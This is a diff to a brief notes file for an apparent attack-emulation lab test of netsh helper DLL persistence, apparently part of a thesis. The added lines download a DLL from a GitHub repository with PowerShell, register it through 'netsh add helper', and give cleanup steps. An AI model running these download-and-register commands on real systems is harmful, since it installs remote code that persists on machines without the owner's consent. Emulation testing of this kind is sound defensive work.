@@ -3,12 +3,16 @@ Event Triggered Execution: Netsh Helper DLL
 
 ---------------------------------------------------
 
-netsh add helper C:\Users\W10_Home\Desktop\malicious.dll
+powershell -Command "Invoke-WebRequest -Uri https://github.com/PaulaMerino/TFM/raw/main/exec/dllExampleInjection2.dll -OutFile '%USERPROFILE%\Downloads\dllExampleInjection2.dll'"
+netsh add helper %USERPROFILE%\Downloads\dllExampleInjection2.dll
 
 netsh.exe
 
 ---------------------------------------------------
 
+CLEAN UP 
+del %USERPROFILE%\Downloads\dllExampleInjection2.dll
+netsh delete helper %USERPROFILE%\Downloads\dllExampleInjection2.dll
 
-la malicious.dll es la dll que esta en la mv ubuntu en ~/Desktop/pruebas/dll/pestudio
+
 
